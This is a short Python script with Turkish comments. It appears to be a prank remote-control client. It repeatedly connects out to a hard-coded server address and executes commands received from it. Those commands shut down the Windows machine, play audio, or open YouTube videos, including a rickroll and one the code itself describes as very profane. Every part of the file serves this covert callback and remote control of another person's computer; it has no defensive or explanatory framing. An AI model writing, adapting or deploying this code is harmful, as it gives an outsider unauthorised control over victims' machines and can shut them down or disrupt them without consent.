import socket
import time
import os
from colorama import init, Fore, Back, Style
import webbrowser
init()

# Sunucu detayları
host = "192.168.56.1"  # Termux'un mobil verisi ile bağlanılacak IP adresi (yada fatih ağının ip adresi ile )
port = 8855  # Yüksek numaralı bir port kullanılıyor çünkü termux 1000den aşşagı kabul etmıo
rıckurl = "https://youtu.be/cvh0nX08nRw?si=AHNqwR-sA63cCeJ7"
essek ="https://youtu.be/p433Idr8KzE?si=9RyIyzcoZKAXGR4k"
style63 ="https://youtu.be/NzGbM0jLZ1g?si=g5WX-VAlXRbJ5w4G"
emrahkos ="https://youtu.be/GS4Zzq2cqp4?si=W6bENCYw_WvihCe2"
while True:
    try:
        # Sunucuya bağlanma denemesi
        baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        baglanti.connect((host, port))

        while True:
            # Sunucudan gelen komutu al
            command = baglanti.recv(1024).decode("utf-8")
            

            # Gelen emirleri yerine getiren kodlar
            if command.lower() == "kapat":
                os.system("shutdown /s /t 1")
                response = "Bilgisayar kapatılıyor."
            elif command.lower() == "ses":
                music_file = "C:/Users/Public/Music/a.mp3"
                os.system(f"start {music_file}")
                response = "Müzik çalınıyor."
            elif command.lower() == "exit":
                response = "Bağlantı sonlandırılıyor."
            elif (command== "rickroll"):
                webbrowser.open(rıckurl)
                response ="rickleniyorrrr"
            elif (command=="emrah koş"):
                webbrowser.open(emrahkos)
                response="EMRAH KOŞŞ"
            elif(command=="eşşek"):
                webbrowser.open("https://youtu.be/p433Idr8KzE?si=9RyIyzcoZKAXGR4k")
                response ="AİİİAİİİ"
            elif(command=="style63"):
                webbrowser.open("https://youtu.be/NzGbM0jLZ1g?si=g5WX-VAlXRbJ5w4G")
                response="dostum bu çok küfürlü"
            elif command== "help":
                response =(Fore.CYAN+" \nVİDEO:karşı sistemde video açar\n"+Fore.RESET+Fore.GREEN+"SES:karşı sistemde istenen sesi açar\n"+Fore.RESET+Fore.YELLOW+"KAPAT:karşı sistemi kapatır\n"+Fore.RESET)
            elif command== "video":
                response=("video seçiniz \neşşek\nemrah koş\nrickrool\nstyle63")
                baglanti.send(response.encode("utf-8"))
                break
            else:
                response = "GEÇERSİZ KOMUT"

            # Sunucuya yanıt gönder
            baglanti.send(response.encode("utf-8"))

        baglanti.close()
    except Exception as e:
        time.sleep(15)
